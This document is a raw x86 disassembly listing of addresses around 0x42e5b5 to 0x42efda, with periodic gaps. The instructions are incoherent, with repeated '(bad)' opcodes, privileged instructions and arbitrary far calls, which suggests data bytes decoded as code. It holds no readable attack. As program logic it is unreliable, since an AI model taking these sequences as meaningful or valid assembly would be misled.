  42e5b5:	outs   dx,DWORD PTR ds:[esi]
  42e5b6:	and    BYTE PTR [ebp-0x3be023cd],bl
  42e5bc:	xor    al,BYTE PTR [ecx+0x15b1248]
  42e5c2:	push   edx
  42e5c3:	xchg   ebx,eax
  42e5c4:	add    BYTE PTR [ebx-0x10],cl
  42e5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5c8:	stc    
  42e5c9:	inc    ch
  42e5cb:	fild   WORD PTR [edi-0x77]
  42e5ce:	push   ebp
  42e5cf:	mov    ch,0xc1
  42e5d1:	jns    0x42e5f7
  42e5d3:	dec    eax
  42e5d4:	dec    ebp
  42e5d5:	pop    ss
  42e5d6:	dec    ecx
  42e5d7:	rcr    ch,cl
  42e5d9:	pop    bp
  42e5db:	daa    
  42e5dc:	les    edx,FWORD PTR [eax]
  42e5de:	add    al,0x53
  42e5e0:	addr16 repz adc eax,0x537c7689
  42e5e7:	dec    ebp
  42e5e8:	xor    DWORD PTR [edi-0x79],0xffffff9a
  42e5ec:	daa    
	...
  42e655:	add    BYTE PTR [ebp+0x38],dl
  42e658:	into   
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	lahf   
  42e663:	leave  
  42e664:	adc    dl,BYTE PTR [edx+0x1f04d]
  42e66a:	inc    DWORD PTR [eax]
  42e66c:	add    BYTE PTR [eax],al
  42e66e:	call   0x80b9:0x8a0af386
  42e675:	loopne 0x42e6da
  42e677:	or     BYTE PTR [esi],bh
  42e679:	nop
  42e67a:	mov    ds:0xa40baac2,eax
  42e67f:	lds    edx,FWORD PTR [edx+0x75]
  42e682:	pushf  
  42e683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e684:	dec    eax
  42e685:	mov    al,0x7d
  42e687:	(bad)  
  42e689:	xor    bl,BYTE PTR [eax+0x12a98321]
  42e68f:	dec    eax
  42e690:	xor    DWORD PTR [edi-0x5d],edi
  42e693:	je     0x42e671
  42e695:	leave  
  42e696:	int3   
  42e697:	dec    ecx
  42e698:	nop
  42e699:	fs cwde 
  42e69b:	and    ah,cl
  42e69d:	loope  0x42e6f3
  42e69f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6a0:	pop    ebp
  42e6a1:	xchg   edx,eax
  42e6a2:	(bad)
  42e6a6:	jp     0x42e6d1
  42e6a8:	add    ebx,ebp
  42e6aa:	xchg   DWORD PTR [esi],edx
  42e6ac:	push   es
  42e6ad:	popf   
  42e6ae:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  42e6b0:	fnstsw WORD PTR fs:[ecx+0xe463c93]
  42e6b7:	and    eax,0x23232dfe
  42e6bc:	jne    0x42e6d6
  42e6be:	call   0x2361:0xf287b82d
  42e6c5:	mov    fs,WORD PTR [ebp+0x4cac2292]
  42e6cb:	outs   dx,DWORD PTR ds:[esi]
  42e6cc:	inc    edi
  42e6cd:	xor    al,BYTE PTR [ecx-0x1c703d60]
  42e6d3:	jmp    0x42e674
  42e6d5:	cmp    BYTE PTR [ebp+0x78c8a5bc],dh
  42e6db:	test   eax,0x1cb759e8
  42e6e0:	shr    esi,0xae
  42e6e3:	je     0x42e761
  42e6e5:	and    BYTE PTR [ebx],ah
  42e6e7:	adc    al,0x7a
  42e6e9:	into   
  42e6ea:	out    dx,eax
  42e6eb:	xor    DWORD PTR [eax],eax
  42e6ed:	dec    ecx
  42e6ee:	repz stc 
  42e6f0:	(bad)
  42e6f5:	cdq    
  42e6f6:	xchg   ebp,eax
  42e6f7:	sbb    eax,0x98361483
  42e6fc:	sub    DWORD PTR [edx+0x34],ebx
  42e6ff:	imul   ebp,DWORD PTR [edx],0xffffff87
  42e702:	inc    eax
  42e703:	jb     0x42e76f
  42e705:	ss hlt 
  42e707:	sub    dl,BYTE PTR [ebx+0x6b]
  42e70a:	(bad)  
  42e70b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e70c:	push   cs
  42e70d:	sbb    esi,DWORD PTR [ebx-0x47]
  42e710:	mov    edx,0xb8044ce2
  42e715:	adc    BYTE PTR [ecx+0x4b],al
  42e718:	imul   esp,esi,0x1ff16df2
  42e71e:	pushf  
  42e71f:	adc    ebp,DWORD PTR [ebp+ebx*1-0x7bbc4ea1]
  42e726:	out    dx,al
  42e727:	hlt    
  42e728:	das    
  42e729:	mov    edi,0xee42ab41
  42e72e:	add    al,0xed
  42e730:	shl    DWORD PTR [edx+0x67],1
  42e733:	daa    
  42e734:	mov    BYTE PTR [edx],cl
  42e736:	call   0x91ec0e13
  42e73b:	out    0xec,al
  42e73d:	psrlq  mm2,mm0
  42e740:	aas    
  42e741:	test   DWORD PTR [edx+0x2e937459],edi
  42e747:	sub    DWORD PTR [ebx],esi
  42e749:	mov    cl,0x40
  42e74b:	mov    edi,0x1a1deb6f
  42e750:	jno    0x42e7a2
  42e752:	sti    
  42e753:	(bad)  
  42e754:	imul   eax,edi,0x27
  42e757:	adc    BYTE PTR ss:[esi+0xb65a930],0x76
  42e75f:	jno    0x42e71b
  42e761:	sub    eax,0x24a32c15
  42e766:	sub    eax,edi
  42e768:	icebp  
  42e769:	push   esi
  42e76a:	cmp    edi,DWORD PTR [eax]
  42e76c:	adc    al,0x0
	...
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	ficom  DWORD PTR [ebx]
  42e7e3:	jno    0x42e793
  42e7e5:	test   eax,0x1f14c
  42e7ea:	inc    DWORD PTR [eax]
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	mov    ch,0xec
  42e7f0:	xor    dh,ah
  42e7f2:	dec    ecx
  42e7f3:	imul   ebp,ecx,0x55a00fac
  42e7f9:	cld    
  42e7fa:	cmp    DWORD PTR [edi],ebp
  42e7fc:	jnp    0x42e87d
  42e7fe:	mov    ecx,DWORD PTR [esi+0x53]
  42e801:	ins    BYTE PTR es:[edi],dx
  42e802:	imul   esp,ecx,0xffffffcc
  42e805:	dec    ebp
  42e806:	sbb    ch,al
  42e808:	jnp    0x42e7dd
  42e80a:	jmp    0x43e0170d
  42e80f:	into   
  42e810:	inc    ecx
  42e811:	mov    al,ds:0x19f99405
  42e816:	fwait
  42e817:	call   FWORD PTR [ebx+0x11]
  42e81a:	mov    esi,0x6e3b67a6
  42e81f:	mov    eax,0xbe9b98c8
  42e824:	jno    0x42e7ca
  42e826:	push   ebx
  42e827:	fwait
  42e828:	cmp    BYTE PTR [ebp+ebp*2-0x77dad3bd],al
  42e82f:	js     0x42e869
  42e831:	shl    BYTE PTR [eax],cl
  42e833:	dec    esp
  42e834:	jge    0x42e800
  42e836:	jne    0x42e838
  42e838:	add    ah,BYTE PTR [edx+0x3adc2f6]
  42e83e:	dec    edx
  42e83f:	enter  0xcc14,0x7a
  42e843:	jle    0x42e84d
  42e845:	cmp    BYTE PTR [eax],al
  42e847:	inc    edx
  42e848:	pop    ebp
  42e849:	leave  
  42e84a:	push   edx
  42e84b:	xor    ch,BYTE PTR [ebp+0x21]
  42e84e:	rcr    ebp,1
  42e850:	(bad)  [ebx-0x32]
  42e853:	fisubr DWORD PTR [edx-0x43]
  42e856:	jmp    0x42e87c
  42e858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e859:	shr    DWORD PTR [edx],cl
  42e85b:	pop    es
  42e85c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e85d:	(bad)  
  42e85f:	xor    al,0x49
  42e861:	adc    ebp,DWORD PTR [eax+esi*8]
  42e864:	in     eax,dx
  42e865:	adc    BYTE PTR ds:0xd1a12989,al
  42e86b:	frstor [ebx]
  42e86d:	adc    al,0xb5
  42e86f:	mov    esi,0x31efabfe
  42e874:	jl     0x42e8eb
  42e876:	lahf   
  42e877:	mov    cl,0x89
  42e879:	mul    BYTE PTR [edx]
  42e87b:	adc    DWORD PTR [edx-0x76],ecx
  42e87e:	mov    ebp,0x5d899413
  42e883:	test   eax,0xeb8288e0
  42e888:	dec    esp
  42e889:	fmul   QWORD PTR [edx-0x56]
  42e88c:	loopne 0x42e82b
  42e88e:	push   edx
  42e88f:	imul   edx,DWORD PTR [ebp-0xc],0x5d4d64bb
  42e896:	adc    BYTE PTR [eax-0x4bb16d19],dl
  42e89c:	test   al,0xbd
  42e89e:	or     al,0xad
  42e8a0:	je     0x42e8b8
  42e8a2:	call   0xd476:0x81cb1fdf
  42e8a9:	mov    ebp,0x1d4a770e
  42e8ae:	add    BYTE PTR [edx-0x50e043ee],0xb8
  42e8b5:	test   eax,0xf98dbd58
  42e8ba:	fimul  WORD PTR [ebx+0x25169667]
  42e8c0:	sbb    DWORD PTR ds:0xf5fe1727,ebp
  42e8c6:	stos   WORD PTR es:[edi],ax
  42e8c8:	loop   0x42e920
  42e8ca:	scas   eax,DWORD PTR es:[edi]
  42e8cb:	mov    ebx,0xf146fb63
  42e8d0:	fisub  WORD PTR [edx+eax*8-0x149d3343]
  42e8d7:	push   ss
  42e8d8:	jb     0x42e8be
  42e8da:	mov    edx,DWORD PTR ds:0xb67bb912
  42e8e0:	nop
  42e8e1:	lods   eax,DWORD PTR ds:[esi]
  42e8e2:	add    bh,BYTE PTR [ebx]
  42e8e4:	out    dx,al
  42e8e5:	sbb    dh,BYTE PTR [ebx-0x41ac9b47]
  42e8eb:	data16 test BYTE PTR [eax],al
	...
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x42dc07d5]
  42e963:	or     dh,BYTE PTR [edx+0x32]
  42e966:	dec    ebx
  42e967:	repnz add DWORD PTR [eax],eax
  42e96a:	inc    DWORD PTR [eax]
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	add    al,0xfe
  42e970:	push   esi
  42e971:	mov    esp,0x2f78de2c
  42e976:	mov    al,0x2f
  42e978:	or     bh,bl
  42e97a:	and    dl,ch
  42e97c:	pop    edi
  42e97d:	call   0xcdc:0x77c26fdd
  42e984:	icebp  
  42e985:	jmp    0xa82d:0x2919ad59
  42e98c:	imul   ebx,DWORD PTR [esi-0x7a089d1c],0xa2acf41d
  42e996:	adc    BYTE PTR [edi],dh
  42e998:	xor    BYTE PTR [edx+esi*8],bl
  42e99b:	push   esi
  42e99c:	mov    cl,0x1
  42e99e:	fdivr  QWORD PTR [ebx-0x13fa972f]
  42e9a4:	push   edx
  42e9a5:	mov    bl,0xbd
  42e9a7:	mov    dl,0x36
  42e9a9:	inc    ebp
  42e9aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9ab:	sbb    bl,BYTE PTR [esi-0x2c]
  42e9ae:	pop    eax
  42e9af:	inc    esp
  42e9b0:	ja     0x42e990
  42e9b2:	out    0x7f,al
  42e9b4:	adc    al,BYTE PTR [esi+0x1479fd7]
  42e9ba:	add    al,0x87
  42e9bc:	or     BYTE PTR [edi-0x6],dh
  42e9bf:	jnp    0x42e95d
  42e9c1:	js     0x42ea04
  42e9c3:	les    edx,FWORD PTR gs:[esi+0x5b5f22d]
  42e9ca:	lea    eax,[esi+0x678982fb]
  42e9d0:	(bad)  
  42e9d1:	sbb    ebp,esi
  42e9d3:	lods   al,BYTE PTR ds:[esi]
  42e9d4:	test   ebx,ebx
  42e9d6:	popf   
  42e9d7:	mov    ch,0x9c
  42e9d9:	mov    ?,WORD PTR [esi-0x1a]
  42e9dc:	jno    0x42e9d1
  42e9de:	mov    bl,0x6d
  42e9e0:	adc    BYTE PTR [ebp-0x6611e294],bh
  42e9e6:	shl    DWORD PTR [ebx+0x3c58bd69],cl
  42e9ec:	cmp    al,0x8e
  42e9ee:	mul    DWORD PTR [esi+0x52]
  42e9f1:	lea    ebx,[edi]
  42e9f3:	push   edi
  42e9f4:	cli    
  42e9f5:	aas    
  42e9f6:	jl     0x42e984
  42e9f8:	cmp    DWORD PTR [ecx-0x7a84c03],edx
  42e9fe:	xchg   ebx,eax
  42e9ff:	xor    dh,BYTE PTR [edi]
  42ea01:	fimul  WORD PTR [esi]
  42ea03:	and    al,al
  42ea05:	addr16 adc al,0x6d
  42ea08:	jne    0x42e9cb
  42ea0a:	jp     0x42ea71
  42ea0c:	mov    esi,0xea02276a
  42ea11:	pop    ebx
  42ea12:	sub    dh,BYTE PTR [ebx+0x65]
  42ea15:	pop    es
  42ea16:	push   ecx
  42ea17:	popf   
  42ea18:	sub    BYTE PTR ds:0x8e4136d,cl
  42ea1e:	sub    eax,0xdb355218
  42ea23:	push   ecx
  42ea24:	and    al,0xe2
  42ea26:	stc    
  42ea27:	in     eax,0x37
  42ea29:	ret    0xb181
  42ea2c:	xor    DWORD PTR [ebp+0x33],eax
  42ea2f:	pushf  
  42ea30:	dec    ecx
  42ea31:	dec    ebp
  42ea32:	clts   
  42ea34:	fwait
  42ea35:	and    al,0x17
  42ea37:	dec    eax
  42ea38:	into   
  42ea39:	push   0x4a
  42ea3b:	mov    dl,0x4f
  42ea3d:	daa    
  42ea3e:	jno    0x42ea8b
  42ea40:	mov    cl,BYTE PTR [ebx+0x66ce9b1a]
  42ea46:	sub    BYTE PTR [ebx+0x67],dh
  42ea49:	ja     0x42e9df
  42ea4b:	repz jg 0x42ea05
  42ea4e:	dec    esp
  42ea4f:	xchg   ebp,ecx
  42ea51:	mov    dh,0x5e
  42ea53:	mov    esp,0x2bfaddaf
  42ea58:	push   0xffffffcc
  42ea5a:	and    edx,DWORD PTR [ebx]
  42ea5c:	std    
  42ea5d:	jns    0x42eaa6
  42ea5f:	jg     0x42ea65
  42ea61:	call   0x908a9de4
  42ea66:	push   es
  42ea67:	xor    eax,0x4467a49a
  42ea6c:	retf   0x0
	...
  42ead3:	add    BYTE PTR [eax],al
  42ead5:	add    ch,ah
  42ead7:	mov    edx,0xebdfe392
  42eadc:	cmc    
  42eadd:	mov    esi,0x66dc160c
  42eae2:	cmp    al,0xa2
  42eae4:	adc    esi,DWORD PTR [ebx+0x4a]
  42eae7:	repz add DWORD PTR [eax],eax
  42eaea:	inc    DWORD PTR [eax]
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	fild   WORD PTR [ebx+0x642b0482]
  42eaf4:	lahf   
  42eaf5:	mov    al,ds:0xb10a27fa
  42eafa:	fdiv   QWORD PTR [ecx+0x3947e65e]
  42eb00:	je     0x42eb59
  42eb02:	inc    esi
  42eb03:	pop    es
  42eb04:	mov    ah,0x45
  42eb06:	mov    ds:0xa095f3d,al
  42eb0b:	lahf   
  42eb0c:	lahf   
  42eb0d:	fcompp 
  42eb0f:	or     cl,BYTE PTR ds:0x9afa097d
  42eb15:	cdq    
  42eb16:	mov    ebx,DWORD PTR [esi-0x5cc2fb46]
  42eb1c:	or     dh,BYTE PTR gs:0x2bb8a4cf
  42eb23:	call   0xff05cb33
  42eb28:	pop    DWORD PTR [ecx]
  42eb2a:	mov    es,WORD PTR [ecx]
  42eb2c:	test   eax,0x2294289a
  42eb31:	fmul   QWORD PTR [ecx]
  42eb33:	dec    ebx
  42eb34:	jnp    0x42eaf8
  42eb36:	xlat   BYTE PTR ds:[ebx]
  42eb37:	inc    edx
  42eb38:	pop    esi
  42eb39:	icebp  
  42eb3a:	stos   BYTE PTR es:[edi],al
  42eb3b:	jl     0x42eb34
  42eb3d:	rol    ah,1
  42eb3f:	rcl    DWORD PTR [ecx],cl
  42eb41:	and    BYTE PTR [esi-0x5bcb5a38],dh
  42eb47:	jg     0x42ead9
  42eb49:	pusha  
  42eb4a:	xchg   esp,eax
  42eb4b:	shl    esi,cl
  42eb4d:	jae    0x42eb07
  42eb4f:	jns    0x42eaf8
  42eb51:	mov    WORD PTR [esi],ss
  42eb53:	jmp    0x117d:0x4126eb69
  42eb5a:	(bad)  
  42eb5b:	aaa    
  42eb5c:	es addr16 repz push ds
  42eb60:	fs ret 0x4f68
  42eb64:	jnp    0x42ebd4
  42eb66:	sbb    bl,ch
  42eb68:	cld    
  42eb69:	mov    ebx,0xbb930b52
  42eb6e:	cmp    eax,0x654d50da
  42eb73:	call   0x407a:0x948aebff
  42eb7a:	lods   al,BYTE PTR ds:[esi]
  42eb7b:	(bad)  
  42eb7c:	(bad)  
  42eb7d:	out    dx,al
  42eb7e:	pop    ebx
  42eb7f:	or     ecx,0xf5696278
  42eb85:	mov    edi,0x1b5ddf9f
  42eb8a:	or     esp,DWORD PTR [ecx+0x6bfa733d]
  42eb90:	or     DWORD PTR [ecx+eax*4-0x33],ebx
  42eb94:	in     al,dx
  42eb95:	and    DWORD PTR [edx],ecx
  42eb97:	fwait
  42eb98:	icebp  
  42eb99:	lock popa 
  42eb9b:	leave  
  42eb9c:	push   0x1e6c94ef
  42eba1:	out    dx,al
  42eba2:	xchg   ecx,eax
  42eba3:	dec    ebp
  42eba4:	or     DWORD PTR [ebx+0x2],esi
  42eba7:	je     0x42eba9
  42eba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ebaa:	dec    edi
  42ebab:	test   al,0x6b
  42ebad:	jbe    0xfe9758ea
  42ebb3:	xchg   DWORD PTR [esi-0x98177c7],esi
  42ebb9:	loop   0x42eb8c
  42ebbb:	test   al,0x13
  42ebbd:	jno    0x42eb95
  42ebbf:	into   
  42ebc0:	inc    eax
  42ebc1:	shr    esp,1
  42ebc3:	loop   0x42ebc8
  42ebc5:	out    dx,eax
  42ebc6:	loope  0x42eb7a
  42ebc8:	mov    cl,0x73
  42ebca:	jecxz  0x42eb5a
  42ebcc:	stc    
  42ebcd:	xchg   edi,eax
  42ebce:	mov    cs,WORD PTR [edi-0x43]
  42ebd1:	lea    esi,[edx]
  42ebd3:	(bad)  [ecx+ebx*4+0x37d130e3]
  42ebda:	mov    WORD PTR [esi+0x5e],cs
  42ebdd:	into   
  42ebde:	clc    
  42ebdf:	sub    edx,DWORD PTR ds:0x95283696
  42ebe5:	ja     0x42eb69
  42ebe7:	retf   
  42ebe8:	scas   eax,DWORD PTR es:[edi]
  42ebe9:	js     0x42ebb2
  42ebeb:	das    
  42ebec:	push   ss
	...
  42ec55:	add    BYTE PTR [esi+0x41],bh
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	sub    ebp,0x49c66c9f
  42ec67:	hlt    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	inc    DWORD PTR [eax]
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	hlt    
  42ec6f:	(bad)  
  42ec70:	or     bh,al
  42ec72:	jp     0x42ec5f
  42ec74:	js     0x42ebfc
  42ec76:	jmp    0xc13d:0xaef6dd98
  42ec7d:	sbb    BYTE PTR ds:0x7cbcbd7d,ch
  42ec83:	fisttp QWORD PTR [ebp+0x40fad8a8]
  42ec89:	xchg   edi,eax
  42ec8a:	inc    esp
  42ec8b:	add    eax,DWORD PTR [edx-0x5d95eb7b]
  42ec91:	push   ebp
  42ec92:	sysret 
  42ec94:	mov    BYTE PTR [ebx],ch
  42ec96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec97:	pop    edx
  42ec98:	sahf   
  42ec99:	test   eax,0x24b514ea
  42ec9e:	les    edx,FWORD PTR [esi*2+0x1c0bc63d]
  42eca5:	push   esi
  42eca6:	aaa    
  42eca7:	loope  0x42ecf7
  42eca9:	pop    ebx
  42ecaa:	inc    esi
  42ecac:	mov    ss:0x9333fb08,eax
  42ecb2:	and    eax,0x2de1db5e
  42ecb7:	or     al,al
  42ecb9:	cmp    DWORD PTR [eax],0x63
  42ecbc:	cmp    ah,BYTE PTR [ebx+eax*4]
  42ecbf:	fild   QWORD PTR [ecx]
  42ecc1:	cmp    al,0x7
  42ecc3:	push   esp
  42ecc4:	and    al,0x98
  42ecc6:	mov    BYTE PTR ds:0x3e1c5bd7,cl
  42eccc:	push   edx
  42eccd:	ja     0x42ec61
  42eccf:	enter  0x3e8e,0x14
  42ecd3:	jno    0x42ed0c
  42ecd5:	jo     0x42ec89
  42ecd7:	jp     0x42ecc6
  42ecd9:	push   ss
  42ecda:	cdq    
  42ecdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecdc:	push   ds
  42ecdd:	dec    esp
  42ecde:	imul   eax,DWORD PTR [edi],0xffffffd9
  42ece1:	(bad)  
  42ece2:	ja     0x42ed1a
  42ece4:	mov    ebx,0x67ff6f52
  42ece9:	pop    ebx
  42ecea:	ret    
  42eceb:	hlt    
  42ecec:	(bad)  [ebx]
  42ecee:	adc    ch,dl
  42ecf0:	inc    edx
  42ecf1:	dec    edx
  42ecf2:	mov    esi,0xa115a946
  42ecf7:	imul   esp,DWORD PTR [edx+0x5dec0a9d],0xffffffd4
  42ecfe:	jae    0x42ecaf
  42ed00:	mov    ebx,0x4c2c16b4
  42ed05:	cmp    BYTE PTR [esi-0x550c2a35],ch
  42ed0b:	icebp  
  42ed0c:	inc    ecx
  42ed0d:	mov    cl,0xfa
  42ed0f:	push   eax
  42ed10:	data16 jg 0x42ecbd
  42ed13:	mov    ch,0xac
  42ed15:	push   ecx
  42ed16:	fwait
  42ed17:	xchg   BYTE PTR [eax+0xa],al
  42ed1a:	and    BYTE PTR [ecx+0x53bea0b7],cl
  42ed20:	popa   
  42ed21:	jo     0x42ed2a
  42ed23:	mov    ebx,0x81554a96
  42ed28:	dec    ebp
  42ed29:	leave  
  42ed2a:	test   al,0xb9
  42ed2c:	js     0x42ecd6
  42ed2e:	adc    DWORD PTR [esi-0x7c],0x1
  42ed32:	popa   
  42ed33:	pusha  
  42ed34:	js     0x42ecd5
  42ed36:	and    dh,bh
  42ed38:	fldenv [edx+0x60]
  42ed3b:	lods   eax,DWORD PTR ds:[esi]
  42ed3c:	shr    BYTE PTR [esi-0x7],cl
  42ed3f:	cmp    BYTE PTR [edi],ch
  42ed41:	mov    esp,0x35518758
  42ed46:	sub    eax,DWORD PTR [ecx]
  42ed48:	adc    DWORD PTR [esi+0x6f],ecx
  42ed4b:	ja     0x42edcb
  42ed4d:	adc    al,0x68
  42ed4f:	ret    
  42ed50:	pop    es
  42ed51:	fadd   QWORD PTR [eax-0x6a]
  42ed54:	mov    edx,0xedea42d5
  42ed59:	sti    
  42ed5a:	mov    ch,0xec
  42ed5c:	scas   al,BYTE PTR es:[edi]
  42ed5d:	dec    esi
  42ed5e:	sti    
  42ed5f:	push   cs
  42ed60:	hlt    
  42ed61:	jecxz  0x42eddc
  42ed63:	(bad)  
  42ed65:	ins    DWORD PTR es:[edi],dx
  42ed66:	packssdw mm2,mm0
  42ed69:	mov    esi,0x36c71c
	...
  42edd6:	sub    dh,dh
  42edd8:	scas   eax,DWORD PTR es:[edi]
  42edd9:	fdivr  st,st(7)
  42eddb:	fnstcw WORD PTR [edi-0xa]
  42edde:	jecxz  0x42ee12
  42ede0:	test   DWORD PTR [edx-0x61bd01ef],esp
  42ede6:	dec    eax
  42ede7:	cmc    
  42ede8:	add    DWORD PTR [eax],eax
  42edea:	inc    DWORD PTR [eax]
  42edec:	add    BYTE PTR [eax],al
  42edee:	sbb    edi,DWORD PTR [ebx+eax*1+0x38191725]
  42edf5:	inc    ebx
  42edf6:	in     eax,dx
  42edf7:	push   esp
  42edf8:	cmc    
  42edf9:	pop    edx
  42edfa:	inc    ebx
  42edfb:	fnsave [ebx-0x3]
  42edfe:	(bad)  
  42edff:	int3   
  42ee00:	jg     0x42edf7
  42ee02:	cwde   
  42ee03:	retf   0xba13
  42ee06:	dec    ebp
  42ee07:	cmp    al,0xdc
  42ee09:	sub    ah,BYTE PTR [edx+0x27]
  42ee0c:	xchg   BYTE PTR [edi+esi*1+0x71db1e83],dh
  42ee13:	ins    BYTE PTR es:[edi],dx
  42ee14:	in     al,dx
  42ee15:	jecxz  0x42ee8c
  42ee17:	in     eax,dx
  42ee18:	stos   BYTE PTR es:[edi],al
  42ee19:	xchg   edi,eax
  42ee1a:	mov    al,0x2f
  42ee1c:	out    dx,al
  42ee1d:	(bad)  
  42ee1e:	aam    0xee
  42ee20:	xchg   esi,eax
  42ee21:	push   es
  42ee22:	adc    ah,al
  42ee24:	add    eax,0x62b56e1b
  42ee29:	xor    dh,dh
  42ee2b:	ds dec esp
  42ee2d:	dec    esi
  42ee2e:	pushf  
  42ee2f:	pop    es
  42ee30:	pop    ecx
  42ee31:	ret    
  42ee32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee33:	inc    ebp
  42ee34:	retf   
  42ee35:	data16 cmp dh,BYTE PTR [edx+0x28fd647d]
  42ee3c:	jb     0x42edf3
  42ee3e:	pop    esi
  42ee3f:	sbb    ch,BYTE PTR [ebx]
  42ee41:	pusha  
  42ee42:	fs and al,0xf0
  42ee45:	ror    BYTE PTR [edi],0x6a
  42ee48:	fyl2x  
  42ee4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee4b:	test   DWORD PTR es:[ebx-0x2],0x7fcfa0b3
  42ee53:	mov    ecx,DWORD PTR [ecx]
  42ee55:	add    al,0xa0
  42ee57:	inc    esi
  42ee58:	jnp    0x42ee98
  42ee5a:	push   ds
  42ee5b:	adc    DWORD PTR [ebx-0x39392ae1],eax
  42ee61:	shl    DWORD PTR [esi+0x3bdfbb87],1
  42ee67:	ss xchg edi,eax
  42ee69:	and    DWORD PTR [esi],eax
  42ee6b:	jmp    0x8c6f:0x4bf0d2b6
  42ee72:	jecxz  0x42eeb8
  42ee74:	loope  0x42ee1f
  42ee76:	sub    al,dl
  42ee78:	je     0x42ee09
  42ee7a:	cmp    al,0x12
  42ee7c:	mov    cl,0xc8
  42ee7e:	fmul   DWORD PTR [esi-0x4d]
  42ee81:	sti    
  42ee82:	cmc    
  42ee83:	lock push 0xfffffffd
  42ee86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee88:	push   es
  42ee89:	push   edi
  42ee8a:	outs   dx,BYTE PTR ds:[esi]
  42ee8b:	mov    edx,0xc44aae57
  42ee90:	stos   BYTE PTR es:[edi],al
  42ee91:	push   esp
  42ee92:	dec    esi
  42ee93:	in     eax,0x19
  42ee95:	xchg   ebp,eax
  42ee96:	in     al,dx
  42ee97:	(bad)  
  42ee98:	cli    
  42ee99:	mov    edx,0x4ee92943
  42ee9e:	inc    DWORD PTR ds:[eax-0x7e]
  42eea2:	(bad)  
  42eea3:	mov    ds:0xcd590cf6,eax
  42eea8:	ins    DWORD PTR es:[edi],dx
  42eea9:	retf   0x7130
  42eeac:	into   
  42eead:	push   es
  42eeae:	stos   BYTE PTR es:[edi],al
  42eeaf:	xor    esp,ecx
  42eeb1:	push   ebp
  42eeb2:	jae    0x42eee2
  42eeb4:	aad    0xbe
  42eeb6:	fptan  
  42eeb8:	cwde   
  42eeb9:	test   eax,0x9a62623f
  42eebe:	arpl   si,cx
  42eec0:	imul   ecx,DWORD PTR ds:0x23825bf,0xffffff82
  42eec7:	adc    eax,0x40040d81
  42eecc:	or     eax,0x7739ce90
  42eed1:	add    dl,cl
  42eed3:	push   ecx
  42eed4:	enter  0x13c3,0xb2
  42eed8:	pop    ecx
  42eed9:	das    
  42eeda:	imul   DWORD PTR [ecx+0x21e14722]
  42eee0:	outs   dx,BYTE PTR ds:[esi]
  42eee1:	sub    esi,DWORD PTR [ebp+0x64415b2f]
  42eee7:	jle    0x42ee97
  42eee9:	aam    0x9c
  42eeeb:	or     BYTE PTR ds:0x0,al
	...
  42ef55:	add    bl,al
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	std    
  42ef63:	fmul   QWORD PTR ds:0x1f647a2
  42ef69:	add    bh,bh
  42ef6b:	add    BYTE PTR [eax],al
  42ef6d:	add    BYTE PTR [eax*4+0x79be0513],ah
  42ef74:	leave  
  42ef75:	mov    ebp,0x3865663b
  42ef7a:	sbb    eax,DWORD PTR [ecx-0x5c]
  42ef7d:	jmp    DWORD PTR [edi]
  42ef7f:	in     eax,0xe8
  42ef81:	xchg   esp,eax
  42ef82:	stc    
  42ef83:	lahf   
  42ef84:	mov    ebx,0x82472276
  42ef89:	lahf   
  42ef8a:	bound  edx,QWORD PTR [ecx-0x1bf327ee]
  42ef90:	out    0x3f,al
  42ef92:	adc    al,0x60
  42ef94:	add    al,0x21
  42ef96:	fs xchg esp,eax
  42ef98:	xor    cl,BYTE PTR [ecx-0x965cfd3]
  42ef9e:	pop    ds
  42ef9f:	shr    DWORD PTR gs:[eax+ecx*1+0x15157894],1
  42efa7:	sbb    ah,bh
  42efa9:	int    0xf3
  42efab:	dec    eax
  42efac:	(bad)  
  42efad:	pop    ebp
  42efae:	das    
  42efaf:	clc    
  42efb0:	mov    ds:0x51fa5bac,al
  42efb5:	mov    esp,0xc1f8adca
  42efba:	mov    ds:0x1aea5c3a,eax
  42efbf:	outs   dx,BYTE PTR ds:[esi]
  42efc0:	imul   DWORD PTR [ecx]
  42efc2:	pop    eax
  42efc3:	inc    esi
  42efc4:	xor    BYTE PTR [eax],bl
  42efc6:	rcr    DWORD PTR [esi+eax*1],cl
  42efc9:	test   DWORD PTR [ebx+esi*2+0x329db727],esp
  42efd0:	ds icebp 
  42efd2:	and    ch,BYTE PTR [eax]
  42efd4:	in     al,0xf8
  42efd6:	ret    
  42efd7:	sti    
  42efd8:	in     eax,0x10
  42efda:	adc    al,0x3f
